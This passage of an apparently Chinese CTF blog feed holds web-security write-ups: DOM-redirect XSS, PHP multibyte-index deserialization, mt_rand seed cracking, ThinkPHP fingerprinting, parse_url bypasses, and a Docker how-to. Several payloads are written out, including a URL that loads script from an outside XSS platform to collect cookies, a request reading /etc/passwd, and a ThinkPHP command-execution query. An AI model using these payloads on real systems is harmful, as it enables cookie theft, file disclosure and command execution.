id="DOM跳转"><a href="#DOM跳转" class="headerlink" title="DOM跳转"></a>DOM跳转</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8cc2801a3c464c193d00baffc33e1cf5.png" alt="img"></p><p>分析一下，代码意思是 从当前页面的URL中获取查询字符串（URL的get参数），如果参数名为”jumpto”，则将页面重定向到参数值所指定的URL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">        var target = location.search.split(&quot;=&quot;)</span><br><span class="line">  //以等号分割成两份，一份是参数名，另一份是参数的值（可利用）</span><br><span class="line">        if (target[0].slice(1) == &quot;jumpto&quot;) &#123;</span><br><span class="line">  //其中target[0].slice(1)是指去掉?后面的参数名</span><br><span class="line">            location.href = target[1];</span><br><span class="line">  //如果参数名相等，就location.href（表示页面跳转）到target[1]，也就是参数的值</span><br><span class="line">        &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>可以利用js代码和 jQuery 的 $.getScript() 函数来异步加载并执行来自 xss平台 的 js 脚本，使用前提是网站引用了jQuery。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0a827819b269477f8353e9ab693fd778.png" alt="img"></p><p>这里构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-c644076cd9fc7c0b.sandbox.ctfhub.com:10800/?jumpto=javascript:$.getScript(&quot;//xsscom.com//He7bc3&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5d1f1a7369a1089bdaf85bfe5d4c2e11.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/81d580917fb146dbd354c87ab6ee6e49.png" alt="img"></p>]]></content>
    
    
    <summary type="html">CTFHub技能树-XSS系列wp</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="web-wp" scheme="https://m3x1.cn/tags/web-wp/"/>
    
  </entry>
  
  <entry>
    <title>XSS在线平台使用</title>
    <link href="https://m3x1.cn/posts/169f5f8e.html"/>
    <id>https://m3x1.cn/posts/169f5f8e.html</id>
    <published>2024-11-27T16:00:00.000Z</published>
    <updated>2024-12-02T09:25:18.658Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>前言：由于自己搭建的xss平台需要服务器才能获取其他网络的cookie，所以无法接收赛题的cookie，最简便的方法还是使用在线平台，虽然可能有一定风险，以后买服务器了再搭建自己的吧</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191835876.png" alt="image-20241128191835876"></p><p>登录后，直接创建项目就行</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191919585.png" alt="image-20241128191919585"></p><p>传入的地址如下：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191232646.png" alt="image-20241128191232646"></p><p>然后就能在平台上接受到了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128192046521.png" alt="image-20241128192046521"></p>]]></content>
    
    
    <summary type="html">XSS在线平台使用</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="其他姿势" scheme="https://m3x1.cn/tags/%E5%85%B6%E4%BB%96%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>mb_strpos与mb_substr错位索引</title>
    <link href="https://m3x1.cn/posts/c81521cb.html"/>
    <id>https://m3x1.cn/posts/c81521cb.html</id>
    <published>2024-11-25T16:00:00.000Z</published>
    <updated>2024-12-02T09:01:07.291Z</updated>
    
    <content type="html"><![CDATA[<h2 id="mb-strpos与mb-substr错位索引"><a href="#mb-strpos与mb-substr错位索引" class="headerlink" title="mb_strpos与mb_substr错位索引"></a>mb_strpos与mb_substr错位索引</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">2. mb_substr和mb_strpos函数漏洞</span><br><span class="line">mb_strpos() 和 mb_substr() 是 PHP 中用于处理多字节字符的函数，专门用于处理 UTF-8 或其他多字节编码的字符串。</span><br><span class="line">(1)mb_strpos: 用于查找一个字符串在另一个字符串中第一次出现的位置（索引），返回结果是该子字符串第一次出现的位置（索引）。</span><br><span class="line">mb_strpos(string $haystack, string $needle, int $offset = 0, string $encoding = null): int|false</span><br><span class="line">    $haystack：要在其中搜索子字符串的源字符串。</span><br><span class="line">    $needle：要搜索的子字符串。</span><br><span class="line">    $offset（可选）：从哪个位置开始搜索，默认为 0。</span><br><span class="line">    $encoding（可选）：要使用的字符编码，默认为内部字符编码。</span><br><span class="line"></span><br><span class="line">(2)mb_substr: 用于获取一个字符串的子串，返回结果是指定位置和长度的子字符串。</span><br><span class="line">mb_substr(string $string, int $start, int $length = null, string $encoding = null): string|false</span><br><span class="line">    $string：要截取的原始字符串。</span><br><span class="line">    $start：截取的起始位置。如果是负数，则表示从末尾开始计数。</span><br><span class="line">    $length（可选）：要截取的长度。如果未指定，则默认截取至字符串的末尾。</span><br><span class="line">    $encoding（可选）：要使用的字符编码，默认为内部字符编码。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">当以 \xF0 开头的字节序列出现在 UTF-8 编码中时，通常表示一个四字节的 Unicode 字符。这是因为 UTF-8 编码规范定义了以 \xF0 开头的字节序列用于编码较大的 Unicode 字符。</span><br><span class="line">不符合4位的规则的话，mb_substr和mb_strpos执行存在差异：</span><br><span class="line">(1)mb_strpos遇到\xF0时，会把无效字节先前的字节视为一个字符，然后从无效字节重新开始解析</span><br><span class="line">mb_strpos(&quot;\xf0\x9fAAA&lt;BB&quot;, &#x27;&lt;&#x27;); #返回4 \xf0\x9f视作是一个字节，从A开始变为无效字节 #A为\x41  上述字符串其认为是7个字节</span><br><span class="line"></span><br><span class="line">(2)mb_substr遇到\xF0时，会把无效字节当做四字节Unicode字符的一部分，然后继续解析</span><br><span class="line">mb_substr(&quot;\xf0\x9fAAA&lt;BB&quot;, 0, 4); #&quot;\xf0\x9fAAA&lt;B&quot; \xf0\x9fAA视作一个字符 上述字符串其认为是5个字节</span><br><span class="line"></span><br><span class="line">结论：mb_strpos相对于mb_substr来说，可以把索引值向后移动</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">3. mb_substr和mb_strpos函数漏洞与本题结合</span><br><span class="line">通过控制C的长度可以控制我们想要执行$key的长度</span><br><span class="line">通过控制B我们可以控制索引值需要提前几位</span><br><span class="line">每发送一个%f0abc，mb_strpos认为是4个字节，mb_substr认为是1个字节，相差3个字节</span><br><span class="line">每发送一个%f0%9fab,mb_strpos认为是3个字节，mb_substr认为是1个字节，相差2个字节</span><br><span class="line">每发送一个%f0%9f%9fa,mb_strpos认为是2个字节，mb_substr认为是1个字节，相差1个字节</span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function substrstr($data)</span><br><span class="line">&#123;</span><br><span class="line">    $start = mb_strpos($data, &quot;[&quot;);</span><br><span class="line">    $end = mb_strpos($data, &quot;]&quot;);</span><br><span class="line">    return mb_substr($data, $start + 1, $end - 1 - $start);</span><br><span class="line">&#125;</span><br><span class="line">class read_file&#123;</span><br><span class="line">    public $start;</span><br><span class="line">    public $filename=&quot;/etc/passwd&quot;;</span><br><span class="line">    public function __construct($start)&#123;</span><br><span class="line">        $this-&gt;start=$start;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        if($this-&gt;start == &quot;gxngxngxn&quot;)&#123;</span><br><span class="line">           echo &#x27;What you are reading is:&#x27;.file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;start&#x27;]))&#123;</span><br><span class="line">    $readfile = new read_file($_GET[&#x27;start&#x27;]);</span><br><span class="line">    $read=isset($_GET[&#x27;read&#x27;])?$_GET[&#x27;read&#x27;]:&quot;I_want_to_Read_flag&quot;;</span><br><span class="line">    if(preg_match(&quot;/\[|\]/i&quot;, $_GET[&#x27;read&#x27;]))&#123;</span><br><span class="line">        die(&quot;NONONO!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $ctf = substrstr($read.&quot;[&quot;.serialize($readfile).&quot;]&quot;);</span><br><span class="line">    unserialize($ctf);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;Start_Funny_CTF!!!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>审计上述代码，发现传入参数start和read，会拼接read和realfile的序列化。</p><p>根据代码知道，在调用函数截取的时候是以 “[” 开始的，但是read里面又不能有 “[”，所以一定只能截取[]内的序列化。但是只有变量start是可控的，其它不可控，看似无解，但可利用上述的漏洞，让其发生错位索引，从而执行我们自己传入的序列化列表。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">如果start=gxngxngxn，序列化为：</span><br><span class="line">O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:11:&quot;/etc/passwd&quot;;&#125;</span><br><span class="line"></span><br><span class="line">如果我们自己构造一个序列化表传入，start=O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:55:&quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;;&#125;</span><br><span class="line">序列化结果为：</span><br><span class="line">O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:126:&quot;O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:55:&quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;;&#125;&quot;;s:8:&quot;filename&quot;;s:11:&quot;/etc/passwd&quot;;&#125;</span><br><span class="line"></span><br><span class="line">相比较，前面多了一串：</span><br><span class="line">O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:126:&quot;</span><br><span class="line">刚好多了38个字符，就可以通过传参read来利用上述漏洞，让他们错位38个索引</span><br></pre></td></tr></table></figure><blockquote><p>payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?read=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%9f%9fa%f0%9f%9fa&amp;start=O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:55:&quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>接下来分析一下，传进去后，在传入截取函数前，它们会组合成：</p><p>%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%9f%9fa%f0%9f%9fa[O:9:”read_file”:2:{s:5:”start”;s:126:”O:9:”read_file”:2:{s:5:”start”;s:9:”gxngxngxn”;s:8:”filename”;s:55:”php://filter/convert.base64-encode/resource=/etc/passwd”;}”;s:8:”filename”;s:11:”/etc/passwd”;}]</p><p>根据上述漏洞，mb_strpos索引”[“时，会索引到 12x4+2x2+1-1 = 52，即”[“下标是52</p><p>mb_substr在截取时，就会从下标为53的截取。 53=12x1+1x2+1+38+1-1，刚好绕过了前面的38个字符串，从而反序列化我们自己传入的序列化表。</p></blockquote>]]></content>
    
    
    <summary type="html">🥧mb_strpos与mb_substr错位索引</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="web姿势" scheme="https://m3x1.cn/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>随机数种子爆破</title>
    <link href="https://m3x1.cn/posts/b4b5a295.html"/>
    <id>https://m3x1.cn/posts/b4b5a295.html</id>
    <published>2024-11-25T16:00:00.000Z</published>
    <updated>2024-12-02T08:49:30.846Z</updated>
    
    <content type="html"><![CDATA[<h2 id="随机数种子爆破"><a href="#随机数种子爆破" class="headerlink" title="随机数种子爆破"></a>随机数种子爆破</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165931510.png" alt="image-20241116165931510"></p><p>在PHP中，变量以$符号开头，后面拼接变量名。上述代码的基本 含义是:从$str变量中随机取32次字符(字符可重复)，并拼接成字符 串，最后将该字符串赋值给变量$password。执行代码后会输出 $password变量的前10个字节，此时通过POST请求传递password参数到 服务端，如果password参数的值与$password变量的值完全相等，那么 就会输出flag。</p><p>理论上，如果选取字符的时候是完全随机的，那么几乎不可能出现 password参数值与$password变量值相等的情况(概率极低)。但由于 代码中使用mt_rand()函数来生成随机数，因此如果可以得知该函数生 成的一段随机数序列，就可以通过工具爆破出其选取的随机数种子 (该种子由$_Session[‘seed’]变量生成)，从而预测之后的所有随机数序 列。在这里，我们使用php_mt_seed工具来爆破随机数种子。该工具的 下载地址为:<a href="https://www.openwall.com/php_mt_seed/php_mt_seed-">https://www.openwall.com/php_mt_seed/php_mt_seed-</a> 4.0.tar.gz</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165647076.png" alt="image-20241116165647076"></p><p>访问题目页面，可得到前10个字节的随机字符，将输出的随机字符转换为php_mt_seed可识别的数据格式。使用</p><p>Python3脚本进行转换:</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165703575.png" alt="image-20241116165703575"></p><p>str1变量的值就是PHP代码中的$str的值，str2变量的值就是PHP代码中 输出的$password的前10个字节。这段代码的基本作用就是将$password 中的前10个字节(即变量str2)进行定位，得到其在str1中的具体下标 位置，然后按照具体格式输出。以str2中的第一个字母A为例，字母A 在变量str1中的下标是36(字符串下标从0开始)</p><p>将输出的字符输入到编译好的php_mt_seed工具中，具体指令如下:</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165734372.png" alt="image-20241116165734372"></p><p>最终我们找到一个随机数种子 19290735(PHP7.1)。在这一步需要注意的是，mt_rand()函数本身确 实存在问题，但是根据PHP版本的不同，其生成的随机数会略有区别。 所以，在实际题目中一定要注意PHP版本问题，不能脱离PHP版本来做 题。</p><p>利用得到的随机数种子编写PHP脚本，如下所示:</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165751773.png" alt="image-20241116165751773"></p><p>尝试将该结果提交给服务端，即可成功得到flag。</p><p>本质上是因为mt_rand()函数的不安全性导致的。所以，我们需要明确 以下几点:</p><p>1) mt_rand()函数的不安全性是考点的核心。 </p><p>2)要爆破随机数种子，首先需要得到mt_rand()函数生成的随机数序</p><p>列。</p><p>3)mt_rand()函数生成的随机数序列可能以不同的形式表现(例如生成 随机字符串)。</p><p>4)相同函数在不同的PHP版本(大版本)中的实现代码可能是不一样 的。例如，在PHP7和PHP5中，mt_rand()函数的实现算法是完全不同 的。</p><p>5)计算机中不存在真正的随机数，这是mt_rand()函数存在安全问题的 根本原因。</p>]]></content>
    
    
    <summary type="html">🥧随机数种子爆破</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="web姿势" scheme="https://m3x1.cn/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>tp漏洞</title>
    <link href="https://m3x1.cn/posts/3b315222.html"/>
    <id>https://m3x1.cn/posts/3b315222.html</id>
    <published>2024-11-24T16:00:00.000Z</published>
    <updated>2024-12-02T09:04:15.023Z</updated>
    
    <content type="html"><![CDATA[<h1 id="tp漏洞"><a href="#tp漏洞" class="headerlink" title="tp漏洞"></a>tp漏洞</h1><h2 id="一-识别tp框架-指纹"><a href="#一-识别tp框架-指纹" class="headerlink" title="一-识别tp框架(指纹)"></a>一-识别tp框架(指纹)</h2><h3 id="1-1-ioc判断"><a href="#1-1-ioc判断" class="headerlink" title="1.1 ioc判断"></a>1.1 ioc判断</h3><p>/favicon.ico</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20516b1e8de85b6b95343771b66b44df.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125193711067.png" alt="image-20241125193711067"></p><h3 id="1-2报错"><a href="#1-2报错" class="headerlink" title="1.2报错"></a>1.2报错</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1c8c509ef3f760f24376d38f6a7625c8.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3b4ccc2eacbbf6163c0ef584d7aeb544.png" alt="img"></p><p>或者 /index.php/index/index/1</p><h3 id="1-3错误传参"><a href="#1-3错误传参" class="headerlink" title="1.3错误传参"></a>1.3错误传参</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/479046ae0c8bf91e2d32d17acc474db9.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ebf2fd7c4ce6bf62b49083a7085bd599.png" alt="img"></p><h3 id="1-4特殊指纹出现logo"><a href="#1-4特殊指纹出现logo" class="headerlink" title="1.4特殊指纹出现logo"></a>1.4特殊指纹出现logo</h3><p>/?c=4e5e5d7364f443e28fbf0d3ae744a59a</p><p>/4e5e5d7364f443e28fbf0d3ae744a59a</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3ddc4ccf08674da045f360091d24546e.png" alt="img"></p><p>p3.1和3.2版本</p><p>4e5e5d7364f443e28fbf0d3ae744a59a-index.html</p><h3 id="1-5-body特征"><a href="#1-5-body特征" class="headerlink" title="1.5 body特征"></a>1.5 body特征</h3><p>body里有”十年磨一剑” 或者”ThinkPHP”</p><h3 id="1-6插件"><a href="#1-6插件" class="headerlink" title="1.6插件"></a>1.6插件</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0684f3dbf50af3128a16c0a775d03eb4.png" alt="img"></p><h2 id="二、利用方法"><a href="#二、利用方法" class="headerlink" title="二、利用方法"></a>二、利用方法</h2><p>数据通过竖线分开, 前面为参数, 后面为函数。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?cacheTime=0&amp;isCache=ls|system  </span><br><span class="line">/index.php/?cacheTime=0&amp;isCache=ls|system   #上面不行就换下面</span><br></pre></td></tr></table></figure><p>根据 thinkphp 的路由规则：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">由于ThinkPHP存在两种路由规则，如下所示</span><br><span class="line">http://serverName/index.php/模块/控制器/操作/[参数名/参数值...]</span><br><span class="line">如果不支持PATHINFO的服务器可以使用兼容模式访问如下：</span><br><span class="line">http://serverName/index.php?s=/模块/控制器/操作/[参数名/参数值...]</span><br><span class="line">也可采用 index.php/a/b/c/$&#123;code&#125;一下形式。</span><br></pre></td></tr></table></figure><p>访问 <code>/index.php/index/index</code>，能够走到题目给出的<code>Index\index</code>里。</p><p>所以一般要先加上路由路径。</p>]]></content>
    
    
    <summary type="html">🥧tp漏洞</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="web姿势" scheme="https://m3x1.cn/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>docker保存和打包镜像</title>
    <link href="https://m3x1.cn/posts/5721bfe4.html"/>
    <id>https://m3x1.cn/posts/5721bfe4.html</id>
    <published>2024-11-23T16:00:00.000Z</published>
    <updated>2024-12-02T09:09:58.908Z</updated>
    
    <content type="html"><![CDATA[<h2 id="docker保存和打包镜像"><a href="#docker保存和打包镜像" class="headerlink" title="docker保存和打包镜像"></a>docker保存和打包镜像</h2><p>作用：在现在容器镜像上保存镜像进行打包，在另一台服务上使用；或现有的容器安装了一些库，配置了开发环境，需要保存下载，下次加载后直接使用。</p><h4 id="1-1-首先查看下现有容器镜像（目的是查询需要保存镜像的ID）"><a href="#1-1-首先查看下现有容器镜像（目的是查询需要保存镜像的ID）" class="headerlink" title="1.1 首先查看下现有容器镜像（目的是查询需要保存镜像的ID）"></a>1.1 首先查看下现有容器镜像（目的是查询需要保存镜像的ID）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><h4 id="1-2-接下来用commit参数进行保存镜像（精简版）"><a href="#1-2-接下来用commit参数进行保存镜像（精简版）" class="headerlink" title="1.2 接下来用commit参数进行保存镜像（精简版）"></a>1.2 接下来用commit参数进行保存镜像（精简版）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit  7ca736d99653    yolov5:v6.2</span><br></pre></td></tr></table></figure><p>其中，7ca736d99653 是需要保存镜像的ID，刚才用docker ps -a 查询到的。</p><h2 id="打包tar"><a href="#打包tar" class="headerlink" title="打包tar"></a>打包tar</h2><p>使用save参数进行打包，格式如：docker save -o  tar文件名称     镜像REPOSITORY:TAG</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker save -o yolov5-v6.2.tar yolov5:v6.2</span><br></pre></td></tr></table></figure><p>其中yolov5:v6.2 是需要保存镜像的REPOSITORY、和TAG；也是上面保存的镜像名称。</p>]]></content>
    
    
    <summary type="html">🥧docker保存和打包镜像</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="其他姿势" scheme="https://m3x1.cn/tags/%E5%85%B6%E4%BB%96%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>parse_url函数</title>
    <link href="https://m3x1.cn/posts/f885edb3.html"/>
    <id>https://m3x1.cn/posts/f885edb3.html</id>
    <published>2024-11-23T16:00:00.000Z</published>
    <updated>2024-12-02T09:02:40.921Z</updated>
    
    <content type="html"><![CDATA[<p>parse_url函数<br>作用：parse_url — 解析 URL，返回其组成部分</p><p>mixed parse_url ( string $url [, int $component = -1 ] )<br>本函数解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。</p><p>参数：<br>url：要解析的 URL。无效字符将使用 _ 来替换。</p><p>component：<br>指定 PHP_URL_SCHEME、 PHP_URL_HOST、 PHP_URL_PORT、 PHP_URL_USER、 PHP_URL_PASS、 PHP_URL_PATH、PHP_URL_QUERY 或 PHP_URL_FRAGMENT 的其中一个来获取 URL 中指定的部分的 string。 （除了指定为PHP_URL_PORT 后，将返回一个 integer 的值）。</p><p>对严重不合格的 URL，parse_url() 可能会返回 FALSE （CTF常用 返回值False 用于逃逸判断）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">DEMO</span><br><span class="line">&lt;?php</span><br><span class="line">$url = &#x27;http://username:password@hostname/path?arg=value#anchor&#x27;;</span><br><span class="line">print_r(parse_url($url));</span><br><span class="line">echo parse_url($url, PHP_URL_PATH);</span><br><span class="line">?&gt;</span><br><span class="line">结果----------------------------------------------------------------------------------------------------</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname</span><br><span class="line">    [user] =&gt; username</span><br><span class="line">    [pass] =&gt; password</span><br><span class="line">    [path] =&gt; /path</span><br><span class="line">    [query] =&gt; arg=value</span><br><span class="line">    [fragment] =&gt; anchor</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>这里我们还输出了当前$url的PHP_URL_PATH 发现是 /path<br>那么如果我们这里把$url中的/path去掉 发现输出的则为 NULL</p><p>tips：parse_url()会把//认为是相对路径（5.4.7以前）<br>如果我们</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = &#x27;//www.example.com/path?googleguy=googley&#x27;;</span><br><span class="line"> </span><br><span class="line">// 在 5.4.7 之前这会输出路径 &quot;//www.example.com/path&quot;</span><br><span class="line">var_dump(parse_url($url));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="2016asisctf的一道web题-DEMO1"><a href="#2016asisctf的一道web题-DEMO1" class="headerlink" title="2016asisctf的一道web题 DEMO1"></a>2016asisctf的一道web题 DEMO1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$data = parse_url($_SERVER[&#x27;REQUEST_URI&#x27;]); </span><br><span class="line">var_dump($data);</span><br><span class="line">$filter=array(&quot;aaa&quot;,&quot;qqqq&quot;);</span><br><span class="line">foreach($filter as $f)</span><br><span class="line">&#123; </span><br><span class="line">if(preg_match(&quot;/&quot;.$f.&quot;/i&quot;, $data[&#x27;query&#x27;]))</span><br><span class="line">&#123; </span><br><span class="line">die(&quot;Attack Detected&quot;); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8493b71d2534228680bc92134d48817d.png" alt="img"></p><p>这里query中的参数有aaa 被preg_match匹配到 所以拦截了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/260d79001d32b5306fb9f046839ee920.png" alt="img"></p><p>这里test.php前面加了一个/ 导致把test.php? 认为成了host 相对的来说 /aaa/xxx 也就成为了路径 这也可以说是一个绕过吧</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a6c48f242ca38058c92a1bc195e6c365.png" alt="img"></p><p>这里test.php前面再多加了一个/ 导致 严重不合格的 URL，parse_url() 返回FALSE 这个是通用的绕过方法</p>]]></content>
    
    
    <summary type="html">🥧parse_url函数</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="web姿势" scheme="https://m3x1.cn/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>深入理解 JavaScript Prototype 污染攻击</title>
    <link href="https://m3x1.cn/posts/575ed4b2.html"/>
    <id>https://m3x1.cn/posts/575ed4b2.html</id>
    <published>2024-11-23T16:00:00.000Z</published>
    <updated>2024-12-02T08:49:14.702Z</updated>
    
